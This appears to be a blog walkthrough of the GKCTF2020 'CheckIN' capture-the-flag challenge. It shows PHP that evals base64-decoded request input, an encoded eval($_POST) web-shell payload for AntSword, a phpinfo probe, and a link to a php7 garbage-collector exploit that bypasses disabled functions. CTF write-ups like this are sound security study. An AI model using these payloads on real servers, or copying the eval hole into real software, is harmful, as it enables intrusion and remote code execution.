---
title: '[GKCTF2020]CheckIN'
date: 2020-05-26 17:00:03
tags: CTF
---

## index.php
``` php
<title>Check_In</title>
<?php 
highlight_file(__FILE__);
class ClassName
{
        public $code = null;
        public $decode = null;
        function __construct()
        {
                $this->code = @$this->x()['Ginkgo'];
                $this->decode = @base64_decode( $this->code );
                @Eval($this->decode);
        }

        public function x()
        {
                return $_REQUEST;
        }
}
new ClassName();
```

## 蚁剑连接
```
eval($_POST[1]);
ZXZhbCgkX1BPU1RbMV0pOw==
http://73c16874-fa6e-413d-9d3f-9e6694cbdcd6.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==
```
![](/images/CheckIN/CheckIN-antsword-edit.png)

![](/images/CheckIN/CheckIN-antsword.png)

## 查看phpinfo
```
phpinfo();
Ginkgo=cGhwaW5mbygpOw==
```
PHP Version 7.3.18

关键函数被禁用
![](/images/CheckIN/CheckIN-phpinfo.png)

## 上传exploit文件
[php7-gc-bypass](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass)
![](/images/CheckIN/CheckIN-exp.png)

## 获得flag
![](/images/CheckIN/CheckIN-flag.png)


